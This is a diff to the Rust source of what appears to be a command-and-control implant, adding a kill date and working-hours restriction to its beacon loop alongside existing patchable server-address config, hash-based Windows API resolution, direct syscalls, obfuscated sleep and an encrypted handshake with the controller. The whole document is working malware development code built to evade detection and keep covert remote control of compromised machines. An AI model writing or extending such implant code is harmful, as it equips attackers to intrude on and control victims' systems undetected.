@@ -24,6 +24,10 @@ pub struct PatchableConfig {
     magic: [u8; 19],
     pub server_addr: [u8; 64],
     pub sleep_interval: u64,
+    pub kill_date: u64,
+    pub working_hours_start: u8,
+    pub working_hours_end: u8,
+    pub padding: [u8; 6],
 }
 
 // Place in .data section to be writable/patchable
@@ -32,6 +36,10 @@ pub static mut GLOBAL_CONFIG: PatchableConfig = PatchableConfig {
     magic: CONFIG_MAGIC,
     server_addr: [0u8; 64], // Zeros to be patched
     sleep_interval: 5000,
+    kill_date: 0,
+    working_hours_start: 0,
+    working_hours_end: 0,
+    padding: [0; 6],
 };
 
 #[derive(Debug, Serialize, Deserialize, Clone, Copy)]
@@ -44,6 +52,8 @@ pub struct C2Config {
     pub transport: TransportType,
     pub server_addr: &'static str,
     pub sleep_interval: u64,
+    pub kill_date: u64,
+    pub working_hours: (u8, u8),
 }
 
 impl C2Config {
@@ -63,6 +73,11 @@ impl C2Config {
                 transport: TransportType::Http,
                 server_addr: addr_str,
                 sleep_interval: core::ptr::addr_of!(GLOBAL_CONFIG.sleep_interval).read(),
+                kill_date: core::ptr::addr_of!(GLOBAL_CONFIG.kill_date).read(),
+                working_hours: (
+                    core::ptr::addr_of!(GLOBAL_CONFIG.working_hours_start).read(),
+                    core::ptr::addr_of!(GLOBAL_CONFIG.working_hours_end).read(),
+                ),
             }
         }
     }
@@ -339,6 +354,48 @@ fn perform_handshake(transport: &mut dyn Transport) -> Result<NoiseTransport, ()
     noise.into_transport(None, peer_ratchet_pub).map_err(|_| ())
 }
 
+fn get_current_unix_time() -> u64 {
+    #[cfg(target_os = "windows")]
+    unsafe {
+        let k32 = hash_str(b"kernel32.dll");
+        type GetSystemTimeAsFileTime = unsafe extern "system" fn(*mut u64);
+        let func = core::mem::transmute::<_, GetSystemTimeAsFileTime>(resolve_function(k32, hash_str(b"GetSystemTimeAsFileTime")));
+        let mut ft = 0u64;
+        func(&mut ft);
+        // FileTime is 100ns intervals since 1601-01-01
+        // Unix is seconds since 1970-01-01
+        (ft / 10_000_000) - 11_644_473_600
+    }
+    #[cfg(not(target_os = "windows"))]
+    unsafe {
+        let mut tp = Timespec { tv_sec: 0, tv_nsec: 0 };
+        sys_clock_gettime(0, &mut tp); // CLOCK_REALTIME = 0
+        tp.tv_sec as u64
+    }
+}
+
+fn get_current_hour() -> u8 {
+    let unix = get_current_unix_time();
+    // Simplified: ignore timezone, assume UTC
+    ((unix % 86400) / 3600) as u8
+}
+
+fn is_kill_date_reached(kill_date: u64) -> bool {
+    if kill_date == 0 { return false; }
+    get_current_unix_time() > kill_date
+}
+
+fn is_within_working_hours(start: u8, end: u8) -> bool {
+    if start == 0 && end == 0 { return true; } // 24/7
+    let hour = get_current_hour();
+    if start < end {
+        hour >= start && hour < end
+    } else {
+        // Wraparound (e.g. 22:00 to 06:00)
+        hour >= start || hour < end
+    }
+}
+
 pub fn run_beacon_loop(_initial_config: C2Config) -> !
 {
     let config = C2Config::get_global();
@@ -353,6 +410,17 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> !
 
     let mut session;
     loop {
+        // Check KillDate
+        if is_kill_date_reached(config.kill_date) {
+            unsafe { crate::utils::syscalls::sys_exit(0) };
+        }
+
+        // Check WorkingHours
+        if !is_within_working_hours(config.working_hours.0, config.working_hours.1) {
+            crate::utils::obfuscation::sleep(600_000); // Sleep 10 mins and check again
+            continue;
+        }
+
         let transport: &mut dyn Transport = if use_udp { &mut udp_transport } else { &mut http_transport };
         
         match perform_handshake(transport) {
@@ -373,6 +441,17 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> !
     let rekey_interval = 120_000 / config.sleep_interval.max(1000); // ~2 minutes
 
     loop {
+        // Check KillDate
+        if is_kill_date_reached(config.kill_date) {
+            unsafe { crate::utils::syscalls::sys_exit(0) };
+        }
+
+        // Check WorkingHours
+        if !is_within_working_hours(config.working_hours.0, config.working_hours.1) {
+            crate::utils::obfuscation::sleep(600_000);
+            continue;
+        }
+
         // Check if rekey is needed
         if packet_count >= 1_000_000 || last_rekey >= rekey_interval {
             session.rekey_dh();
